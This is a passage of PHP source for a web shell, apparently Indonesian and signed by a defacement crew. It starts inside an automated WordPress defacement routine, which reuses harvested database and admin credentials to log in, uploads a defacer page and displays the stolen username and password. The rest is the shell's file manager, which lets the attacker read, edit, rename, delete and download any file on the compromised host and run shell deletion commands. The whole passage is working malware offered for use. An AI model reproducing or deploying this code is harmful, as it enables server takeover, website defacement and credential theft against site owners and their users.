                          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                          curl_setopt($ch, CURLOPT_POST, 1);
                          curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                          curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                    $data3 = curl_exec($ch);
                          curl_close($ch);
                    $y = date("Y");
                    $m = date("m");
                    $namafile = "id.php";
                    $fpi = fopen($namafile,"w");
                    fputs($fpi,$script);
                    $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                           curl_setopt($ch6, CURLOPT_POST, true);
                           curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                           curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                           curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                           curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                           curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
                    $postResult = curl_exec($ch6);
                           curl_close($ch6);
                    $as = "$target/k.php";
                    $bs = anucurl($as);
                    if(preg_match("#$script#is", $bs)) {
                        echo "[+] <font color='blue'>berhasil mepes...</font><br>";
                        echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                        } else {
                        echo "[-] <font color='red'>gagal mepes...</font><br>";
                        echo "[!!] coba aja manual: <br>";
                        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                        echo "[+] username: <font color=blue>$user</font><br>";
                        echo "[+] password: <font color=blue>$pass</font><br><br>";    
                        }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center><h1>WordPress Auto Deface</h1>
        <form method='post'>
        <input type='text' name='link_config' size='50' height='10' value='$dir'><br>
        <input type='text' name='script' height='10' size='50' placeholder='Hacked By N45HT' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
        </form>
        <br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
        </center>";
    }
} elseif($_GET['act'] == 'newfile') {
    if($_POST['new_save_file']) {
        $newfile = htmlspecialchars($_POST['newfile']);
        $fopen = fopen($newfile, "a+");
        if($fopen) {
            $act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_file' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'newfolder') {
    if($_POST['new_save_folder']) {
        $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
        if(!mkdir($new_folder)) {
            $act = "<font color=red>permission denied</font>";
        } else {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_folder' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'rename_dir') {
    if($_POST['dir_rename']) {
        $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
        if($dir_rename) {
            $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "<form method='post'>
    <input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
    <input type='submit' name='dir_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete_dir') {
    if(is_dir($dir)) {
        if(is_writable($dir)) {
            @rmdir($dir);
            @exe("rm -rf $dir");
            @exe("rmdir /s /q $dir");
            $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
        } else {
            $act = "<font color=red>could not remove ".basename($dir)."</font>";
        }
    }
    echo $act;
} elseif($_GET['act'] == 'view') {
    echo "Filename: <font color=blue>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
    if($_POST['save']) {
        $save = file_put_contents($_GET['file'], $_POST['src']);
        if($save) {
            $act = "<font color=blue>Saved!</font>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=blue>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
    <input type='submit' value='Save' name='save' style='width: 500px;'>
    </form>";
} elseif($_GET['act'] == 'rename') {
    if($_POST['do_rename']) {
        $rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
        if($rename) {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=blue>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
    <input type='submit' name='do_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete') {
    $delete = unlink($_GET['file']);
    if($delete) {
        $act = "<script>window.location='?dir=".$dir."';</script>";
    } else {
        $act = "<font color=red>permission denied</font>";
    }
    echo $act;
} else {
    if(is_dir($dir) === true) {
        if(!is_readable($dir)) {
            echo "<font color=lavender>can't open directory. ( not readable )</font>";
        } else {
            echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
            <tr>
            <th class="th_home"><center>Name</center></th>
            <th class="th_home"><center>Type</center></th>
            <th class="th_home"><center>Size</center></th>
            <th class="th_home"><center>Last Modified</center></th>
            <th class="th_home"><center>Owner/Group</center></th>
            <th class="th_home"><center>Permission</center></th>
            <th class="th_home"><center>Action</center></th>
            </tr>';
            $scandir = scandir($dir);
            foreach($scandir as $dirx) {
                $dtype = filetype("$dir/$dirx");
                $dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
                if(function_exists('posix_getpwuid')) {
                    $downer = @posix_getpwuid(fileowner("$dir/$dirx"));
                    $downer = $downer['name'];
                } else {
                    //$downer = $uid;
                    $downer = fileowner("$dir/$dirx");
                }
                if(function_exists('posix_getgrgid')) {
                    $dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
                    $dgrp = $dgrp['name'];
                } else {
                    $dgrp = filegroup("$dir/$dirx");
                }
                if(!is_dir("$dir/$dirx")) continue;
                if($dirx === '..') {
                    $href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
                } elseif($dirx === '.') {
                    $href = "<a href='?dir=$dir'>$dirx</a>";
                } else {
                    $href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
                }
                if($dirx === '.' || $dirx === '..') {
                    $act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
                    } else {
                    $act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
                }
                echo "<tr>";
                 echo "<td class='td_home'><img src='http://icons.iconarchive.com/icons/binassmax/pry-frente-black-special/24/ribbon-3-icon.png'>$href</td>";
                echo "<td class='td_home'><center>$dtype</center></td>";
                echo "<td class='td_home'><center>-</center></th></td>";
                echo "<td class='td_home'><center>$dtime</center></td>";
                echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
                echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
                echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
                echo "</tr>";
            }
        }
    } else {
        echo "<font color=red>can't open directory.</font>";
    }
        foreach($scandir as $file) {
            $ftype = filetype("$dir/$file");
            $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
            $size = filesize("$dir/$file")/1024;
            $size = round($size,3);
            if(function_exists('posix_getpwuid')) {
                $fowner = @posix_getpwuid(fileowner("$dir/$file"));
                $fowner = $fowner['name'];
            } else {
                //$downer = $uid;
                $fowner = fileowner("$dir/$file");
            }
            if(function_exists('posix_getgrgid')) {
                $fgrp = @posix_getgrgid(filegroup("$dir/$file"));
                $fgrp = $fgrp['name'];
            } else {
                $fgrp = filegroup("$dir/$file");
            }
            if($size > 1024) {
                $size = round($size/1024,2). 'MB';
            } else {
                $size = $size. 'KB';
            }
            if(!is_file("$dir/$file")) continue;
            echo "<tr>";
            echo "<td class='td_home'><img src='http://icons.iconarchive.com/icons/ziggy19/adobe-cc-tilt-rectangle/24/Adobe-Me-icon.png'><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
            echo "<td class='td_home'><center>$ftype</center></td>";
            echo "<td class='td_home'><center>$size</center></td>";
            echo "<td class='td_home'><center>$ftime</center></td>";
            echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
            echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
            echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
            echo "</tr>";
        }
        echo "</table>";
        if(!is_readable($dir)) {
            //
        } else {
            echo "<hr>";
        }
    echo "<center>Copyright @ ".date("Y")." - Mr.r3NduX69 N45HT CREW</font></a></center>";
}
?>